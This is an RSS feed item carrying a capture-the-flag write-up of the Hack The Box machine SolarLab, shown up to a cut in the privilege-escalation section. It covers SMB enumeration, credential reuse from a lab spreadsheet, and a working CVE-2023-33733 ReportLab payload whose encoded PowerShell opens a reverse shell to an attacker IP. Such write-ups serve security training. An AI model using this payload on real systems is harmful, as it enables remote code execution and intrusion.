<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Smb on Shakil's Blog</title><link>https://hshakilst.github.io/tags/smb/</link><description>Recent content in Smb on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Thu, 16 May 2024 18:00:05 +0200</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/smb/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Machine Solarlab</title><link>https://hshakilst.github.io/posts/htb-machines/solarlab/</link><pubDate>Thu, 16 May 2024 18:00:05 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/solarlab/</guid><description><![CDATA[<h1 id="solar-lab---htbhttpsapphacktheboxcommachinessolarlab">Solar Lab - <a href="https://app.hackthebox.com/machines/SolarLab">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT     STATE SERVICE       REASON  VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD
</span></span><span style="display:flex;"><span>|_http-title: SolarLab Instant Messenger
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds? syn-ack
</span></span><span style="display:flex;"><span>6791/tcp open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-05-14T14:01:13
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: -5m11s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 64857/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 37138/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 48381/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 52237/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span></code></pre></div><h2 id="http-enumeration">HTTP Enumeration</h2>
<p><strong><a href="http://report.solarlab.htb:6791">http://report.solarlab.htb:6791</a></strong></p>
<p><img src="images/report_portal.png" alt="Login Portal"></p>
<p>Unfortunately couldn&rsquo;t log in, no credential was available.</p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>Message signing enabled but not required.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass -L //10.10.11.16    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span>	---------       ----      -------
</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>	C$              Disk      Default share
</span></span><span style="display:flex;"><span>	Documents       Disk      
</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
</span></span></code></pre></div><p><code>Documents</code> share was interesting so let&rsquo;s connect and list the contents of it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass  //10.10.11.16/Documents
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                  DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  ..                                 DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  concepts                            D        0  Fri Apr 26 16:41:57 2024
</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      278  Fri Nov 17 10:54:43 2023
</span></span><span style="display:flex;"><span>  details-file.xlsx                   A    12793  Fri Nov 17 12:27:21 2023
</span></span><span style="display:flex;"><span>  My Music                        DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Pictures                     DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Videos                       DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  old_leave_request_form.docx         A    37194  Fri Nov 17 10:35:57 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		7779839 blocks of size 4096. 1885790 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; 
</span></span></code></pre></div><p>There are some document files stored in the share. Let&rsquo;s download them and analyze.</p>
<h2 id="exif-metadata-analysis">EXIF Metadata Analysis</h2>
<ul>
<li>
<p><strong>old_leave_request_form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : old_leave_request_form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 37 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:03+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x5c9ce90a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 483
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2460
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>_NewReviewCycle                 : 
</span></span><span style="display:flex;"><span>Creator                         : Alison Melville
</span></span><span style="display:flex;"><span>Last Modified By                : Jackie
</span></span><span style="display:flex;"><span>Revision Number                 : 3
</span></span><span style="display:flex;"><span>Create Date                     : 2015:07:06 22:19:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:08:03 16:50:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 142
</span></span><span style="display:flex;"><span>Characters                      : 814
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 6
</span></span><span style="display:flex;"><span>Paragraphs                      : 1
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Greig Melville Associates Limited
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 955
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>details-file.xlsx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : details-file.xlsx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 13 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:24+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : XLSX
</span></span><span style="display:flex;"><span>File Type Extension             : xlsx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd125f54a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 388
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1681
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : College of Education
</span></span><span style="display:flex;"><span>Last Modified By                : Paul Serban
</span></span><span style="display:flex;"><span>Create Date                     : 2011:03:24 14:38:51Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2023:11:17 12:27:21Z
</span></span><span style="display:flex;"><span>Application                     : Microsoft Excel
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Worksheets, 3
</span></span><span style="display:flex;"><span>Titles Of Parts                 : Sheet1, Sheet2, Sheet3
</span></span><span style="display:flex;"><span>Company                         : Purdue University
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 16.0300
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Enabled: true
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SetDate: 2023-11-17T10:41:19Z
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Method: Standard
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Name: All Employees_2
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SiteId: 33440fc6-b7c7-412c-bb73-0e70b0198d5a
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ActionId: c1afab2c-84d2-450d-9066-dcc727984137
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ContentBits: 0
</span></span></code></pre></div><p>This file contains MIP Metadata which are part of <code>Microsoft Information Protection SDK - Metadata</code>. So it might contain some juicy informations.</p>
</li>
<li>
<p><strong>Training-Request-Form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Training-Request-Form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 161 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:39+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd2250c4f
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 470
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2223
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : Gayle.Rennie
</span></span><span style="display:flex;"><span>Last Modified By                : FRYATT, Susanne (WGPSN)
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 44 minutes
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 188
</span></span><span style="display:flex;"><span>Characters                      : 1078
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 8
</span></span><span style="display:flex;"><span>Paragraphs                      : 2
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Wood Group
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 1264
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>Travel-Request-Sample.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Travel-Request-Sample.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 31 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:02+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x7d32bdda
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 440
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1997
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Title                           : 
</span></span><span style="display:flex;"><span>Subject                         : 
</span></span><span style="display:flex;"><span>Creator                         : Paul Squillace
</span></span><span style="display:flex;"><span>Keywords                        : 
</span></span><span style="display:flex;"><span>Description                     : 
</span></span><span style="display:flex;"><span>Last Modified By                : Katy Brown
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 351
</span></span><span style="display:flex;"><span>Characters                      : 2003
</span></span><span style="display:flex;"><span>Application                     : Microsoft Macintosh Word
</span></span><span style="display:flex;"><span>Doc Security                    : Read-only enforced
</span></span><span style="display:flex;"><span>Lines                           : 16
</span></span><span style="display:flex;"><span>Paragraphs                      : 4
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Microsoft
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 2350
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
</ul>
<h2 id="credentials">Credentials</h2>
<p>The <strong>details-file.xlsx</strong> contained sensitive information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Password File							
</span></span><span style="display:flex;"><span>                            
</span></span><span style="display:flex;"><span>Alexander&#39;s SSN		123-23-5424					
</span></span><span style="display:flex;"><span>Claudia&#39;s SSN		820-378-3984					
</span></span><span style="display:flex;"><span>Blake&#39;s SSN		739-1846-436
</span></span></code></pre></div><table>
<thead>
<tr>
<th>Site</th>
<th>Account#</th>
<th>Username</th>
<th>Password</th>
<th>Security Question</th>
<th>Answer</th>
<th>Email</th>
<th>Other information</th>
</tr>
</thead>
<tbody>
<tr>
<td>Amazon.com</td>
<td>101-333</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>al;ksdhfewoiuh</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Blue</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Pefcu</td>
<td>A233J</td>
<td>KAlexander</td>
<td>dkjafblkjadsfgl</td>
<td>What was your high school mascot</td>
<td>Pine Tree</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Chase</td>
<td></td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>d398sadsknr390</td>
<td>What was the name of your first pet?</td>
<td>corvette</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Fidelity</td>
<td></td>
<td>blake.byte</td>
<td>ThisCanB3typedeasily1@</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Helena	blake@purdue.edu</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Signa</td>
<td></td>
<td>AlexanderK</td>
<td>danenacia9234n</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Poppyseed muffins</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>account number: 1925-47218-30</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ClaudiaS</td>
<td>dadsfawe9dafkn</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>yellow crayon</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td>account number: 3872-03498-45</td>
</tr>
<tr>
<td>Comcast</td>
<td>JHG3434</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Vectren</td>
<td>YUIO576</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Verizon</td>
<td>1111-5555-33</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>With the above credentials I tried to login to the <code>report.solarlab.htb:6791</code> and found a match. Apparently, the username structure for this organization is <code>Firstname + Lastname Initial</code>.</p>
<p>The matched credential is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>**********:ThisCanB3typedeasily1@
</span></span></code></pre></div><h2 id="enumerating-the-report-portal-dashboard">Enumerating The Report Portal Dashboard</h2>
<p><img src="images/report_dashboard.png" alt="Report Portal Dashboard"></p>
<p>It was a portal for sending/approving leave request/vacation approval etc. After filling the form and <strong>uploading a image</strong> for attaching signature, Ait generated a pdf file.</p>
<p><img src="images/generated_pdf.png" alt="Generated PDF"></p>
<p>Examining the generated pdf file with exiftool I discovered it was using <code>ReportLab PDF Library</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : output.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 277 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Author                          : (anonymous)
</span></span><span style="display:flex;"><span>Create Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Creator                         : (unspecified)
</span></span><span style="display:flex;"><span>Modify Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Producer                        : ReportLab PDF Library - www.reportlab.com
</span></span><span style="display:flex;"><span>Subject                         : (unspecified)
</span></span><span style="display:flex;"><span>Title                           : (anonymous)
</span></span><span style="display:flex;"><span>Trapped                         : False
</span></span><span style="display:flex;"><span>Page Mode                       : UseNone
</span></span><span style="display:flex;"><span>Page Count                      : 1
</span></span></code></pre></div><p>A quick search for this library resulted in that this library maybe (because I couldn&rsquo;t determine the version of the library) vulnerable to an RCE. Read more about it on <a href="https://www.bleepingcomputer.com/news/security/exploit-released-for-rce-flaw-in-popular-reportlab-pdf-library/">BleepingComputer</a>.</p>
<p>A publicly available PoC was released on <a href="https://github.com/c53elyas/CVE-2023-33733">Github</a>.</p>
<p>The vulnerability was due to how it handled converting HTML to PDF (the flaw in xhtml2pdf).</p>
<p><strong>PoC:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;para&gt;
</span></span><span style="display:flex;"><span>    &lt;font
</span></span><span style="display:flex;"><span>        color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span><span style="display:flex;"><span>        exploit
</span></span><span style="display:flex;"><span>    &lt;/font&gt;
</span></span><span style="display:flex;"><span>&lt;/para&gt;
</span></span></code></pre></div><p><strong>Delivery:</strong></p>
<p>The <code>justification</code> field is limited by 300 characters so it cannot be used also we cannot attach html file. And the date section is accepts date range. So that leaves <code>ome_office_request</code> parameter to deliver the payload.</p>
<h2 id="foothold">Foothold</h2>
<p>We got a shell as blake and our user flag.</p>
<h2 id="privesc-enumeration">PrivEsc Enumeration</h2>
<p>I found a sqlite database inside the <code>app/instance</code> directory.</p>
<ul>
<li>
<p><strong>users.db</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1	blakeb	ThisCanB3typedeasily1@
</span></span><span style="display:flex;"><span>2	claudias	007poiuytrewq
</span></span><span style="display:flex;"><span>3	alexanderk	HotP!fireguard
</span></span></code></pre></div></li>
<li>
<p><strong>Current User Info</strong></p>
